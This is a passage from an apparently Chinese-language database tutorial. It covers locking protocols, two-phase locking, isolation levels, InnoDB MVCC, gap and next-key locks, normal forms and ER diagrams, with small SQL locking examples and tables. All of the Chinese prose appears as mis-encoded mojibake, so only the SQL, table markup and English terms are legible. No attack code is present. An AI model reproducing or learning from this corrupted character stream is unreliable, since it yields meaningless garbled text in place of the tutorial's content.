è¿›è¡Œä¿®æ”¹ï¼Œæ ¹æ® 1 çº§å°é”åè®®ï¼Œä¼šåŠ  X é”ï¼Œé‚£ä¹ˆå°±ä¸èƒ½å†åŠ  S é”äº†ï¼Œä¹Ÿå°±æ˜¯ä¸ä¼šè¯»å…¥æ•°æ®ã€‚</p><p>| T1 | T2 | | :--: | :--: | | lock-x(A) | | | read A=20 | | | write A=19 | | | | lock-s(A) | |  | wait | | rollback | .| | A=20 |. | | unlock-x(A) |. | | | obtain | | | read A=20 | | | unlock-s(A)| | | commit |</p><p><b>ä¸‰çº§å°é”åè®®</b> </p><p>åœ¨äºŒçº§çš„åŸºç¡€ä¸Šï¼Œè¦æ±‚è¯»å–æ•°æ® A æ—¶å¿…é¡»åŠ  S é”ï¼Œç›´åˆ°äº‹åŠ¡ç»“æŸäº†æ‰èƒ½é‡Šæ”¾ S é”ã€‚</p><p>å¯ä»¥è§£å†³ä¸å¯é‡å¤è¯»çš„é—®é¢˜ï¼Œå› ä¸ºè¯» A æ—¶ï¼Œå…¶å®ƒäº‹åŠ¡ä¸èƒ½å¯¹ A åŠ  X é”ï¼Œä»è€Œé¿å…äº†åœ¨è¯»çš„æœŸé—´æ•°æ®å‘ç”Ÿæ”¹å˜ã€‚</p><p>| T1 | T2 | | :--: | :--: | | lock-s(A) | | | read A=20 | | |  |lock-x(A) | | | wait | |  read A=20| . | | commit | .| | unlock-s(A) |. | | | obtain | | | read A=20 | | | write A=19| | | commit | | | unlock-X(A)|</p><h3>2. ä¸¤æ®µé”åè®®</h3><p>åŠ é”å’Œè§£é”åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µè¿›è¡Œã€‚</p><p>å¯ä¸²è¡ŒåŒ–è°ƒåº¦æ˜¯æŒ‡ï¼Œé€šè¿‡å¹¶å‘æ§åˆ¶ï¼Œä½¿å¾—å¹¶å‘æ‰§è¡Œçš„äº‹åŠ¡ç»“æœä¸æŸä¸ªä¸²è¡Œæ‰§è¡Œçš„äº‹åŠ¡ç»“æœç›¸åŒã€‚</p><p>äº‹åŠ¡éµå¾ªä¸¤æ®µé”åè®®æ˜¯ä¿è¯å¯ä¸²è¡ŒåŒ–è°ƒåº¦çš„å……åˆ†æ¡ä»¶ã€‚ä¾‹å¦‚ä»¥ä¸‹æ“ä½œæ»¡è¶³ä¸¤æ®µé”åè®®ï¼Œå®ƒæ˜¯å¯ä¸²è¡ŒåŒ–è°ƒåº¦ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">lock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B)</code></pre></div><p>ä½†ä¸æ˜¯å¿…è¦æ¡ä»¶ï¼Œä¾‹å¦‚ä»¥ä¸‹æ“ä½œä¸æ»¡è¶³ä¸¤æ®µé”åè®®ï¼Œä½†æ˜¯å®ƒè¿˜æ˜¯å¯ä¸²è¡ŒåŒ–è°ƒåº¦ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">lock-x(A)...unlock(A)...lock-s(B)...unlock(B)...lock-s(C)...unlock(C)</code></pre></div><h2>MySQL éšå¼ä¸æ˜¾ç¤ºé”å®š</h2><p>MySQL çš„ InnoDB å­˜å‚¨å¼•æ“é‡‡ç”¨ä¸¤æ®µé”åè®®ï¼Œä¼šæ ¹æ®éš”ç¦»çº§åˆ«åœ¨éœ€è¦çš„æ—¶å€™è‡ªåŠ¨åŠ é”ï¼Œå¹¶ä¸”æ‰€æœ‰çš„é”éƒ½æ˜¯åœ¨åŒä¸€æ—¶åˆ»è¢«é‡Šæ”¾ï¼Œè¿™è¢«ç§°ä¸ºéšå¼é”å®šã€‚</p><p>InnoDB ä¹Ÿå¯ä»¥ä½¿ç”¨ç‰¹å®šçš„è¯­å¥è¿›è¡Œæ˜¾ç¤ºé”å®šï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"p\">...</span> <span class=\"k\">LOCK</span> <span class=\"k\">In</span> <span class=\"k\">SHARE</span> <span class=\"k\">MODE</span><span class=\"p\">;</span>\n<span class=\"k\">SELECT</span> <span class=\"p\">...</span> <span class=\"k\">FOR</span> <span class=\"k\">UPDATE</span><span class=\"p\">;</span></code></pre></div><h2>å››ã€éš”ç¦»çº§åˆ«</h2><h2>æœªæäº¤è¯»ï¼ˆREAD UNCOMMITTEDï¼‰</h2><p>äº‹åŠ¡ä¸­çš„ä¿®æ”¹ï¼Œå³ä½¿æ²¡æœ‰æäº¤ï¼Œå¯¹å…¶å®ƒäº‹åŠ¡ä¹Ÿæ˜¯å¯è§çš„ã€‚</p><h2>æäº¤è¯»ï¼ˆREAD COMMITTEDï¼‰</h2><p>ä¸€ä¸ªäº‹åŠ¡åªèƒ½è¯»å–å·²ç»æäº¤çš„äº‹åŠ¡æ‰€åšçš„ä¿®æ”¹ã€‚æ¢å¥è¯è¯´ï¼Œä¸€ä¸ªäº‹åŠ¡æ‰€åšçš„ä¿®æ”¹åœ¨æäº¤ä¹‹å‰å¯¹å…¶å®ƒäº‹åŠ¡æ˜¯ä¸å¯è§çš„ã€‚</p><h2>å¯é‡å¤è¯»ï¼ˆREPEATABLE READï¼‰</h2><p>ä¿è¯åœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­å¤šæ¬¡è¯»å–åŒæ ·æ•°æ®çš„ç»“æœæ˜¯ä¸€æ ·çš„ã€‚</p><h2>å¯ä¸²è¡ŒåŒ–ï¼ˆSERIALIZABLEï¼‰</h2><p>å¼ºåˆ¶äº‹åŠ¡ä¸²è¡Œæ‰§è¡Œã€‚</p><p>éœ€è¦åŠ é”å®ç°ï¼Œè€Œå…¶å®ƒéš”ç¦»çº§åˆ«é€šå¸¸ä¸éœ€è¦ã€‚</p><hr/><p>| éš”ç¦»çº§åˆ« | è„è¯» | ä¸å¯é‡å¤è¯» | å¹»å½±è¯» | | :---: | :---: | :---:| :---: | | æœªæäº¤è¯» | âˆš | âˆš | âˆš | | æäº¤è¯» | Ã— | âˆš | âˆš | | å¯é‡å¤è¯» | Ã— | Ã— | âˆš | | å¯ä¸²è¡ŒåŒ– | Ã— | Ã— | Ã— |</p><h2>äº”ã€å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶</h2><p>å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMulti-Version Concurrency Control, MVCCï¼‰æ˜¯ MySQL çš„ InnoDB å­˜å‚¨å¼•æ“å®ç°éš”ç¦»çº§åˆ«çš„ä¸€ç§å…·ä½“æ–¹å¼ï¼Œç”¨äºå®ç°æäº¤è¯»å’Œå¯é‡å¤è¯»è¿™ä¸¤ç§éš”ç¦»çº§åˆ«ã€‚è€Œæœªæäº¤è¯»éš”ç¦»çº§åˆ«æ€»æ˜¯è¯»å–æœ€æ–°çš„æ•°æ®è¡Œï¼Œæ— éœ€ä½¿ç”¨ MVCCã€‚å¯ä¸²è¡ŒåŒ–éš”ç¦»çº§åˆ«éœ€è¦å¯¹æ‰€æœ‰è¯»å–çš„è¡Œéƒ½åŠ é”ï¼Œå•çº¯ä½¿ç”¨ MVCC æ— æ³•å®ç°ã€‚</p><h2>ç‰ˆæœ¬å·</h2><ul><li>ç³»ç»Ÿç‰ˆæœ¬å·ï¼šæ˜¯ä¸€ä¸ªé€’å¢çš„æ•°å­—ï¼Œæ¯å¼€å§‹ä¸€ä¸ªæ–°çš„äº‹åŠ¡ï¼Œç³»ç»Ÿç‰ˆæœ¬å·å°±ä¼šè‡ªåŠ¨é€’å¢ã€‚</li><li>äº‹åŠ¡ç‰ˆæœ¬å·ï¼šäº‹åŠ¡å¼€å§‹æ—¶çš„ç³»ç»Ÿç‰ˆæœ¬å·ã€‚</li></ul><h2>éšè—çš„åˆ—</h2><p>MVCC åœ¨æ¯è¡Œè®°å½•åé¢éƒ½ä¿å­˜ç€ä¸¤ä¸ªéšè—çš„åˆ—ï¼Œç”¨æ¥å­˜å‚¨ä¸¤ä¸ªç‰ˆæœ¬å·ï¼š</p><ul><li>åˆ›å»ºç‰ˆæœ¬å·ï¼šæŒ‡ç¤ºåˆ›å»ºä¸€ä¸ªæ•°æ®è¡Œçš„å¿«ç…§æ—¶çš„ç³»ç»Ÿç‰ˆæœ¬å·ï¼›</li><li>åˆ é™¤ç‰ˆæœ¬å·ï¼šå¦‚æœè¯¥å¿«ç…§çš„åˆ é™¤ç‰ˆæœ¬å·å¤§äºå½“å‰äº‹åŠ¡ç‰ˆæœ¬å·è¡¨ç¤ºè¯¥å¿«ç…§æœ‰æ•ˆï¼Œå¦åˆ™è¡¨ç¤ºè¯¥å¿«ç…§å·²ç»è¢«åˆ é™¤äº†ã€‚</li></ul><h2>Undo æ—¥å¿—</h2><p>MVCC ä½¿ç”¨åˆ°çš„å¿«ç…§å­˜å‚¨åœ¨ Undo æ—¥å¿—ä¸­ï¼Œè¯¥æ—¥å¿—é€šè¿‡å›æ»šæŒ‡é’ˆæŠŠä¸€ä¸ªæ•°æ®è¡Œï¼ˆRecordï¼‰çš„æ‰€æœ‰å¿«ç…§è¿æ¥èµ·æ¥ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-e4fb40fe4b5144998bf1b1179d8da315_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"536\" data-rawheight=\"195\" class=\"origin_image zh-lightbox-thumb\" width=\"536\" data-original=\"https://pic2.zhimg.com/v2-e4fb40fe4b5144998bf1b1179d8da315_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;536&#39; height=&#39;195&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"536\" data-rawheight=\"195\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"536\" data-original=\"https://pic2.zhimg.com/v2-e4fb40fe4b5144998bf1b1179d8da315_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-e4fb40fe4b5144998bf1b1179d8da315_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å®ç°è¿‡ç¨‹</h2><p>ä»¥ä¸‹å®ç°è¿‡ç¨‹é’ˆå¯¹å¯é‡å¤è¯»éš”ç¦»çº§åˆ«ã€‚</p><p>å½“å¼€å§‹ä¸€ä¸ªäº‹åŠ¡æ—¶ï¼Œè¯¥äº‹åŠ¡çš„ç‰ˆæœ¬å·è‚¯å®šå¤§äºå½“å‰æ‰€æœ‰æ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·ï¼Œç†è§£è¿™ä¸€ç‚¹å¾ˆå…³é”®ã€‚æ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·æ˜¯åˆ›å»ºæ•°æ®è¡Œå¿«ç…§æ—¶çš„ç³»ç»Ÿç‰ˆæœ¬å·ï¼Œç³»ç»Ÿç‰ˆæœ¬å·éšç€åˆ›å»ºäº‹åŠ¡è€Œé€’å¢ï¼Œå› æ­¤æ–°åˆ›å»ºä¸€ä¸ªäº‹åŠ¡æ—¶ï¼Œè¿™ä¸ªäº‹åŠ¡çš„ç³»ç»Ÿç‰ˆæœ¬å·æ¯”ä¹‹å‰çš„ç³»ç»Ÿç‰ˆæœ¬å·éƒ½å¤§ï¼Œä¹Ÿå°±æ˜¯æ¯”æ‰€æœ‰æ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·éƒ½å¤§ã€‚</p><h3>1. SELECT</h3><p>å¤šä¸ªäº‹åŠ¡å¿…é¡»è¯»å–åˆ°åŒä¸€ä¸ªæ•°æ®è¡Œçš„å¿«ç…§ï¼Œå¹¶ä¸”è¿™ä¸ªå¿«ç…§æ˜¯è·ç¦»ç°åœ¨æœ€è¿‘çš„ä¸€ä¸ªæœ‰æ•ˆå¿«ç…§ã€‚ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–ï¼Œå¦‚æœæœ‰ä¸€ä¸ªäº‹åŠ¡æ­£åœ¨ä¿®æ”¹è¯¥æ•°æ®è¡Œï¼Œé‚£ä¹ˆå®ƒå¯ä»¥è¯»å–äº‹åŠ¡æœ¬èº«æ‰€åšçš„ä¿®æ”¹ï¼Œè€Œä¸ç”¨å’Œå…¶å®ƒäº‹åŠ¡çš„è¯»å–ç»“æœä¸€è‡´ã€‚</p><p>æŠŠæ²¡æœ‰å¯¹ä¸€ä¸ªæ•°æ®è¡Œåšä¿®æ”¹çš„äº‹åŠ¡ç§°ä¸º Tï¼ŒT æ‰€è¦è¯»å–çš„æ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·å¿…é¡»å°äº T çš„ç‰ˆæœ¬å·ï¼Œå› ä¸ºå¦‚æœå¤§äºæˆ–è€…ç­‰äº T çš„ç‰ˆæœ¬å·ï¼Œé‚£ä¹ˆè¡¨ç¤ºè¯¥æ•°æ®è¡Œå¿«ç…§æ˜¯å…¶å®ƒäº‹åŠ¡çš„æœ€æ–°ä¿®æ”¹ï¼Œå› æ­¤ä¸èƒ½å»è¯»å–å®ƒã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒT æ‰€è¦è¯»å–çš„æ•°æ®è¡Œå¿«ç…§çš„åˆ é™¤ç‰ˆæœ¬å·å¿…é¡»å¤§äº T çš„ç‰ˆæœ¬å·ï¼Œå› ä¸ºå¦‚æœå°äºç­‰äº T çš„ç‰ˆæœ¬å·ï¼Œé‚£ä¹ˆè¡¨ç¤ºè¯¥æ•°æ®è¡Œå¿«ç…§æ˜¯å·²ç»è¢«åˆ é™¤çš„ï¼Œä¸åº”è¯¥å»è¯»å–å®ƒã€‚</p><h3>2. INSERT</h3><p>å°†å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºæ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·ã€‚</p><h3>3. DELETE</h3><p>å°†å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºæ•°æ®è¡Œå¿«ç…§çš„åˆ é™¤ç‰ˆæœ¬å·ã€‚</p><h3>4. UPDATE</h3><p>å°†å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºæ›´æ–°å‰çš„æ•°æ®è¡Œå¿«ç…§çš„åˆ é™¤ç‰ˆæœ¬å·ï¼Œå¹¶å°†å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºæ›´æ–°åçš„æ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·ã€‚å¯ä»¥ç†è§£ä¸ºå…ˆæ‰§è¡Œ DELETE åæ‰§è¡Œ INSERTã€‚</p><h2>å¿«ç…§è¯»ä¸å½“å‰è¯»</h2><h3>1. å¿«ç…§è¯»</h3><p>ä½¿ç”¨ MVCC è¯»å–çš„æ˜¯å¿«ç…§ä¸­çš„æ•°æ®ï¼Œè¿™æ ·å¯ä»¥å‡å°‘åŠ é”æ‰€å¸¦æ¥çš„å¼€é”€ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">select</span> <span class=\"o\">*</span> <span class=\"k\">from</span> <span class=\"k\">table</span> <span class=\"p\">...;</span></code></pre></div><h3>2. å½“å‰è¯»</h3><p>è¯»å–çš„æ˜¯æœ€æ–°çš„æ•°æ®ï¼Œéœ€è¦åŠ é”ã€‚ä»¥ä¸‹ç¬¬ä¸€ä¸ªè¯­å¥éœ€è¦åŠ  S é”ï¼Œå…¶å®ƒéƒ½éœ€è¦åŠ  X é”ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">select</span> <span class=\"o\">*</span> <span class=\"k\">from</span> <span class=\"k\">table</span> <span class=\"k\">where</span> <span class=\"o\">?</span> <span class=\"k\">lock</span> <span class=\"k\">in</span> <span class=\"k\">share</span> <span class=\"k\">mode</span><span class=\"p\">;</span>\n<span class=\"k\">select</span> <span class=\"o\">*</span> <span class=\"k\">from</span> <span class=\"k\">table</span> <span class=\"k\">where</span> <span class=\"o\">?</span> <span class=\"k\">for</span> <span class=\"k\">update</span><span class=\"p\">;</span>\n<span class=\"k\">insert</span><span class=\"p\">;</span>\n<span class=\"k\">update</span><span class=\"p\">;</span>\n<span class=\"k\">delete</span><span class=\"p\">;</span></code></pre></div><h2>å…­ã€Next-Key Locks</h2><p>Next-Key Locks æ˜¯ MySQL çš„ InnoDB å­˜å‚¨å¼•æ“çš„ä¸€ç§é”å®ç°ã€‚</p><p>MVCC ä¸èƒ½è§£å†³å¹»å½±è¯»é—®é¢˜ï¼ŒNext-Key Locks å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜è€Œå­˜åœ¨çš„ã€‚åœ¨å¯é‡å¤è¯»ï¼ˆREPEATABLE READï¼‰éš”ç¦»çº§åˆ«ä¸‹ï¼Œä½¿ç”¨ MVCC + Next-Key Locks å¯ä»¥è§£å†³å¹»è¯»é—®é¢˜ã€‚</p><h2>Record Locks</h2><p>é”å®šä¸€ä¸ªè®°å½•ä¸Šçš„ç´¢å¼•ï¼Œè€Œä¸æ˜¯è®°å½•æœ¬èº«ã€‚</p><p>å¦‚æœè¡¨æ²¡æœ‰è®¾ç½®ç´¢å¼•ï¼ŒInnoDB ä¼šè‡ªåŠ¨åœ¨ä¸»é”®ä¸Šåˆ›å»ºéšè—çš„èšç°‡ç´¢å¼•ï¼Œå› æ­¤ Record Locks ä¾ç„¶å¯ä»¥ä½¿ç”¨ã€‚</p><h2>Gap Locks</h2><p>é”å®šç´¢å¼•ä¹‹é—´çš„é—´éš™ï¼Œä½†æ˜¯ä¸åŒ…å«ç´¢å¼•æœ¬èº«ã€‚ä¾‹å¦‚å½“ä¸€ä¸ªäº‹åŠ¡æ‰§è¡Œä»¥ä¸‹è¯­å¥ï¼Œå…¶å®ƒäº‹åŠ¡å°±ä¸èƒ½åœ¨ t.c ä¸­æ’å…¥ 15ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"k\">c</span> <span class=\"k\">FROM</span> <span class=\"n\">t</span> <span class=\"k\">WHERE</span> <span class=\"k\">c</span> <span class=\"k\">BETWEEN</span> <span class=\"mi\">10</span> <span class=\"k\">and</span> <span class=\"mi\">20</span> <span class=\"k\">FOR</span> <span class=\"k\">UPDATE</span><span class=\"p\">;</span></code></pre></div><h2>Next-Key Locks</h2><p>å®ƒæ˜¯ Record Locks å’Œ Gap Locks çš„ç»“åˆï¼Œä¸ä»…é”å®šä¸€ä¸ªè®°å½•ä¸Šçš„ç´¢å¼•ï¼Œä¹Ÿé”å®šç´¢å¼•ä¹‹é—´çš„é—´éš™ã€‚ä¾‹å¦‚ä¸€ä¸ªç´¢å¼•åŒ…å«ä»¥ä¸‹å€¼ï¼š10, 11, 13, and 20ï¼Œé‚£ä¹ˆå°±éœ€è¦é”å®šä»¥ä¸‹åŒºé—´ï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"p\">(</span><span class=\"o\">-</span><span class=\"err\">âˆ</span><span class=\"p\">,</span> <span class=\"mi\">10</span><span class=\"p\">]</span>\n<span class=\"p\">(</span><span class=\"mi\">10</span><span class=\"p\">,</span> <span class=\"mi\">11</span><span class=\"p\">]</span>\n<span class=\"p\">(</span><span class=\"mi\">11</span><span class=\"p\">,</span> <span class=\"mi\">13</span><span class=\"p\">]</span>\n<span class=\"p\">(</span><span class=\"mi\">13</span><span class=\"p\">,</span> <span class=\"mi\">20</span><span class=\"p\">]</span>\n<span class=\"p\">(</span><span class=\"mi\">20</span><span class=\"p\">,</span> <span class=\"o\">+</span><span class=\"err\">âˆ</span><span class=\"p\">)</span></code></pre></div><h2>ä¸ƒã€å…³ç³»æ•°æ®åº“è®¾è®¡ç†è®º</h2><h2>å‡½æ•°ä¾èµ–</h2><p>è®° A-&gt;B è¡¨ç¤º A å‡½æ•°å†³å®š Bï¼Œä¹Ÿå¯ä»¥è¯´ B å‡½æ•°ä¾èµ–äº Aã€‚</p><p>å¦‚æœ {A1ï¼ŒA2ï¼Œ... ï¼ŒAn} æ˜¯å…³ç³»çš„ä¸€ä¸ªæˆ–å¤šä¸ªå±æ€§çš„é›†åˆï¼Œè¯¥é›†åˆå‡½æ•°å†³å®šäº†å…³ç³»çš„å…¶å®ƒæ‰€æœ‰å±æ€§å¹¶ä¸”æ˜¯æœ€å°çš„ï¼Œé‚£ä¹ˆè¯¥é›†åˆå°±ç§°ä¸ºé”®ç ã€‚</p><p>å¯¹äº A-&gt;Bï¼Œå¦‚æœèƒ½æ‰¾åˆ° A çš„çœŸå­é›† A&#39;ï¼Œä½¿å¾— A&#39;-&gt; Bï¼Œé‚£ä¹ˆ A-&gt;B å°±æ˜¯éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼Œå¦åˆ™å°±æ˜¯å®Œå…¨å‡½æ•°ä¾èµ–ã€‚</p><p>å¯¹äº A-&gt;Bï¼ŒB-&gt;Cï¼Œåˆ™ A-&gt;C æ˜¯ä¸€ä¸ªä¼ é€’å‡½æ•°ä¾èµ–ã€‚</p><h2>å¼‚å¸¸</h2><p>ä»¥ä¸‹çš„å­¦ç”Ÿè¯¾ç¨‹å…³ç³»çš„å‡½æ•°ä¾èµ–ä¸º {Sno, Cname} -&gt; {Sname, Sdept, Mname, Grade}ï¼Œé”®ç ä¸º {Sno, Cname}ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¡®å®šå­¦ç”Ÿå’Œè¯¾ç¨‹ä¹‹åï¼Œå°±èƒ½ç¡®å®šå…¶å®ƒä¿¡æ¯ã€‚</p><p>| Sno | Sname | Sdept | Mname | Cname | Grade | | :---: | :---: | :---: | :---: | :---: |:---:| | 1 | å­¦ç”Ÿ-1 | å­¦é™¢-1 | é™¢é•¿-1 | è¯¾ç¨‹-1 | 90 | | 2 | å­¦ç”Ÿ-2 | å­¦é™¢-2 | é™¢é•¿-2 | è¯¾ç¨‹-2 | 80 | | 2 | å­¦ç”Ÿ-2 | å­¦é™¢-2 | é™¢é•¿-2 | è¯¾ç¨‹-1 | 100 | | 3 | å­¦ç”Ÿ-3 | å­¦é™¢-2 | é™¢é•¿-2 | è¯¾ç¨‹-2 | 95 |</p><p>ä¸ç¬¦åˆèŒƒå¼çš„å…³ç³»ï¼Œä¼šäº§ç”Ÿå¾ˆå¤šå¼‚å¸¸ï¼Œä¸»è¦æœ‰ä»¥ä¸‹å››ç§å¼‚å¸¸ï¼š</p><ul><li>å†—ä½™æ•°æ®ï¼šä¾‹å¦‚ <code>å­¦ç”Ÿ-2</code> å‡ºç°äº†ä¸¤æ¬¡ã€‚</li><li>ä¿®æ”¹å¼‚å¸¸ï¼šä¿®æ”¹äº†ä¸€ä¸ªè®°å½•ä¸­çš„ä¿¡æ¯ï¼Œä½†æ˜¯å¦ä¸€ä¸ªè®°å½•ä¸­ç›¸åŒçš„ä¿¡æ¯å´æ²¡æœ‰è¢«ä¿®æ”¹ã€‚</li><li>åˆ é™¤å¼‚å¸¸ï¼šåˆ é™¤ä¸€ä¸ªä¿¡æ¯ï¼Œé‚£ä¹ˆä¹Ÿä¼šä¸¢å¤±å…¶å®ƒä¿¡æ¯ã€‚ä¾‹å¦‚åˆ é™¤äº† <code>è¯¾ç¨‹-1</code> éœ€è¦åˆ é™¤ç¬¬ä¸€è¡Œå’Œç¬¬ä¸‰è¡Œï¼Œé‚£ä¹ˆ <code>å­¦ç”Ÿ-1</code> çš„ä¿¡æ¯å°±ä¼šä¸¢å¤±ã€‚</li><li>æ’å…¥å¼‚å¸¸ï¼šä¾‹å¦‚æƒ³è¦æ’å…¥ä¸€ä¸ªå­¦ç”Ÿçš„ä¿¡æ¯ï¼Œå¦‚æœè¿™ä¸ªå­¦ç”Ÿè¿˜æ²¡é€‰è¯¾ï¼Œé‚£ä¹ˆå°±æ— æ³•æ’å…¥ã€‚</li></ul><h2>èŒƒå¼</h2><p>èŒƒå¼ç†è®ºæ˜¯ä¸ºäº†è§£å†³ä»¥ä¸Šæåˆ°å››ç§å¼‚å¸¸ã€‚</p><p>é«˜çº§åˆ«èŒƒå¼çš„ä¾èµ–äºä½çº§åˆ«çš„èŒƒå¼ï¼Œ1NF æ˜¯æœ€ä½çº§åˆ«çš„èŒƒå¼ã€‚</p><h3>1. ç¬¬ä¸€èŒƒå¼ (1NF)</h3><p>å±æ€§ä¸å¯åˆ†ã€‚</p><h3>2. ç¬¬äºŒèŒƒå¼ (2NF)</h3><p>æ¯ä¸ªéä¸»å±æ€§å®Œå…¨å‡½æ•°ä¾èµ–äºé”®ç ã€‚</p><p>å¯ä»¥é€šè¿‡åˆ†è§£æ¥æ»¡è¶³ã€‚</p><p><b>åˆ†è§£å‰</b> <br/></p><p>| Sno | Sname | Sdept | Mname | Cname | Grade | | :---: | :---: | :---: | :---: | :---: |:---:| | 1 | å­¦ç”Ÿ-1 | å­¦é™¢-1 | é™¢é•¿-1 | è¯¾ç¨‹-1 | 90 | | 2 | å­¦ç”Ÿ-2 | å­¦é™¢-2 | é™¢é•¿-2 | è¯¾ç¨‹-2 | 80 | | 2 | å­¦ç”Ÿ-2 | å­¦é™¢-2 | é™¢é•¿-2 | è¯¾ç¨‹-1 | 100 | | 3 | å­¦ç”Ÿ-3 | å­¦é™¢-2 | é™¢é•¿-2 | è¯¾ç¨‹-2 | 95 |</p><p>ä»¥ä¸Šå­¦ç”Ÿè¯¾ç¨‹å…³ç³»ä¸­ï¼Œ{Sno, Cname} ä¸ºé”®ç ï¼Œæœ‰å¦‚ä¸‹å‡½æ•°ä¾èµ–ï¼š</p><ul><li>Sno -&gt; Sname, Sdept</li><li>Sdept -&gt; Mname</li><li>Sno, Cname-&gt; Grade</li></ul><p>Grade å®Œå…¨å‡½æ•°ä¾èµ–äºé”®ç ï¼Œå®ƒæ²¡æœ‰ä»»ä½•å†—ä½™æ•°æ®ï¼Œæ¯ä¸ªå­¦ç”Ÿçš„æ¯é—¨è¯¾éƒ½æœ‰ç‰¹å®šçš„æˆç»©ã€‚</p><p>Sname, Sdept å’Œ Mname éƒ½éƒ¨åˆ†ä¾èµ–äºé”®ç ï¼Œå½“ä¸€ä¸ªå­¦ç”Ÿé€‰ä¿®äº†å¤šé—¨è¯¾æ—¶ï¼Œè¿™äº›æ•°æ®å°±ä¼šå‡ºç°å¤šæ¬¡ï¼Œé€ æˆå¤§é‡å†—ä½™æ•°æ®ã€‚</p><p><b>åˆ†è§£å</b> <br/></p><p>å…³ç³»-1</p><p>| Sno | Sname | Sdept | Mname | | :---: | :---: | :---: | :---: | | 1 | å­¦ç”Ÿ-1 | å­¦é™¢-1 | é™¢é•¿-1 | | 2 | å­¦ç”Ÿ-2 | å­¦é™¢-2 | é™¢é•¿-2 | | 3 | å­¦ç”Ÿ-3 | å­¦é™¢-2 | é™¢é•¿-2 |</p><p>æœ‰ä»¥ä¸‹å‡½æ•°ä¾èµ–ï¼š</p><ul><li>Sno -&gt; Sname, Sdept</li><li>Sdept -&gt; Mname</li></ul><p>å…³ç³»-2</p><p>| Sno | Cname | Grade | | :---: | :---: |:---:| | 1 | è¯¾ç¨‹-1 | 90 | | 2 | è¯¾ç¨‹-2 | 80 | | 2 | è¯¾ç¨‹-1 | 100 | | 3 | è¯¾ç¨‹-2 | 95 |</p><p>æœ‰ä»¥ä¸‹å‡½æ•°ä¾èµ–ï¼š</p><ul><li>Sno, Cname -&gt;  Grade</li></ul><h3>3. ç¬¬ä¸‰èŒƒå¼ (3NF)</h3><p>éä¸»å±æ€§ä¸ä¼ é€’å‡½æ•°ä¾èµ–äºé”®ç ã€‚</p><p>ä¸Šé¢çš„ å…³ç³»-1 ä¸­å­˜åœ¨ä»¥ä¸‹ä¼ é€’å‡½æ•°ä¾èµ–ï¼š</p><ul><li>Sno -&gt; Sdept -&gt; Mname</li></ul><p>å¯ä»¥è¿›è¡Œä»¥ä¸‹åˆ†è§£ï¼š</p><p>å…³ç³»-11</p><p>| Sno | Sname | Sdept | | :---: | :---: | :---: | | 1 | å­¦ç”Ÿ-1 | å­¦é™¢-1 | | 2 | å­¦ç”Ÿ-2 | å­¦é™¢-2 | | 3 | å­¦ç”Ÿ-3 | å­¦é™¢-2 |</p><p>å…³ç³»-12</p><p>| Sdept | Mname | | :---: | :---: | | å­¦é™¢-1 | é™¢é•¿-1 | | å­¦é™¢-2 | é™¢é•¿-2 |</p><h2>å…«ã€ER å›¾</h2><p>Entity-Relationshipï¼Œæœ‰ä¸‰ä¸ªç»„æˆéƒ¨åˆ†ï¼šå®ä½“ã€å±æ€§ã€è”ç³»ã€‚</p><p>ç”¨æ¥è¿›è¡Œå…³ç³»å‹æ•°æ®åº“ç³»ç»Ÿçš„æ¦‚å¿µè®¾è®¡ã€‚</p><h2>å®ä½“çš„ä¸‰ç§è”ç³»</h2><p>åŒ…å«ä¸€å¯¹ä¸€ï¼Œä¸€å¯¹å¤šï¼Œå¤šå¯¹å¤šä¸‰ç§ã€‚</p><ul><li>å¦‚æœ A åˆ° B æ˜¯ä¸€å¯¹å¤šå…³ç³»ï¼Œé‚£ä¹ˆç”»ä¸ªå¸¦ç®­å¤´çš„çº¿æ®µæŒ‡å‘ Bï¼›</li><li>å¦‚æœæ˜¯ä¸€å¯¹ä¸€ï¼Œç”»ä¸¤ä¸ªå¸¦ç®­å¤´çš„çº¿æ®µï¼›</li><li>å¦‚æœæ˜¯å¤šå¯¹å¤šï¼Œç”»ä¸¤ä¸ªä¸å¸¦ç®­å¤´çš„çº¿æ®µã€‚</li></ul><p>ä¸‹å›¾çš„ Course å’Œ Student 